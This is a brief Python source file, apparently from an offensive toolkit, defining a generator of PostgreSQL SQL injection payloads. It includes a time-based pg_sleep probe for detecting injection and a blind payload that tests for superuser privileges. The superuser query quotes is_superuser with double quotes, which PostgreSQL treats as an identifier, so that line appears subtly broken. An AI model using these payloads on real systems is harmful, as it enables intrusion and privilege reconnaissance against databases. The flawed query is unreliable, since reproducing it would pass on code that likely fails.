"""
File that generates SQLi payloads.

Author: Aleksa Zatezalo
Date: January 2025
"""

class PostgresPayloadGenerator:
    def __init__(self):
        self.sleep_time = 3

    def set_sleep_time(self, seconds: int):
        """Set the sleep time for time-based attacks"""
        self.sleep_time = seconds
    
    def test_payload(self) -> str:
        """Generate a simple sleep payload to test for SQL injection"""
        return f"select pg_sleep({self.sleep_time});"

    def superuser_check_payload(self) -> str:
        """Generate payload to check if current user is superuser"""
        return f'SELECT case when (SELECT current_setting("is_superuser"))="on" then pg_sleep({self.sleep_time}) end;--'